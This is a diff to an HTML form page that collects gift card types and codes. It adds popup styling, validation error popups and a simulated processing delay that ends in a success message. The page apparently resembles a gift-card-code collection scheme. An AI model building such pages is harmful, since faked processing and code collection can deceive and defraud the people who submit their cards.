@@ -108,13 +108,78 @@ button:hover {
   margin-top: 10px;
   color: #555;
 }
+
+/* Popup success/error */
+.popup {
+  display: none;
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  background: #fff;
+  border: 1px solid #e6e6e6;
+  padding: 22px;
+  max-width: 320px;
+  text-align: center;
+  z-index: 1000;
+  border-radius: 6px;
+  box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+}
+
+.popup h2 {
+  margin-top: 0;
+  font-size: 16px;
+}
+
+.popup p {
+  font-size: 13px;
+  color: #555;
+}
+
+.popup button {
+  margin-top: 12px;
+  background: #1a73e8;
+  color: #fff;
+  padding: 8px 14px;
+  font-size: 13px;
+  border-radius: 4px;
+  cursor: pointer;
+  border: none;
+}
+
+.popup button:hover {
+  background: #1558b0;
+}
+
+/* Overlay */
+.overlay {
+  display: none;
+  position: fixed;
+  top:0;
+  left:0;
+  width:100%;
+  height:100%;
+  background: rgba(0,0,0,0.35);
+  z-index: 900;
+}
 </style>
 
 <script>
 let lastSubmit = 0;
 
+function showPopup(type, message) {
+  document.getElementById('overlay').style.display = 'block';
+  const popup = document.getElementById(type);
+  popup.querySelector('p').innerText = message;
+  popup.style.display = 'block';
+}
+
+function closePopup(type) {
+  document.getElementById('overlay').style.display = 'none';
+  document.getElementById(type).style.display = 'none';
+}
+
 function validateForm() {
-  // Rate-limit: 15 sec
   const now = Date.now();
   if (now - lastSubmit < 15000) {
     alert("Please wait before submitting again.");
@@ -126,11 +191,10 @@ function validateForm() {
   const code = document.getElementById("card_code").value.trim();
 
   if (!type || !code) {
-    window.location.href = "error.html";
+    showPopup('errorPopup', 'Please select a card type and enter a valid code.');
     return false;
   }
 
-  // Card-specific length logic (informational only)
   const rules = {
     "Amazon": [13, 14],
     "Apple": [16],
@@ -140,14 +204,22 @@ function validateForm() {
   };
 
   if (rules[type] && !rules[type].includes(code.length)) {
-    window.location.href = "error.html";
+    showPopup('errorPopup', 'Invalid code length for this card type.');
     return false;
   }
 
   document.getElementById("loader").style.display = "block";
+
+  // Simulate processing delay
+  setTimeout(() => {
+    document.getElementById("loader").style.display = "none";
+    showPopup('successPopup', 'Your request has been successfully submitted. Verify balance with the official issuer.');
+  }, 1500);
+
   return true;
 }
 </script>
+
 </head>
 
 <body>
@@ -199,6 +271,23 @@ function validateForm() {
     </div>
 
   </div>
+</div>
+
+<!-- Overlay for popups -->
+<div id="overlay" class="overlay"></div>
+
+<!-- Success popup -->
+<div id="successPopup" class="popup">
+  <h2>Request Submitted</h2>
+  <p></p>
+  <button onclick="closePopup('successPopup')">Close</button>
+</div>
+
+<!-- Error popup -->
+<div id="errorPopup" class="popup">
+  <h2>Error</h2>
+  <p></p>
+  <button onclick="closePopup('errorPopup')">Close</button>
 </div>
 
 <!-- Privacy-safe analytics -->
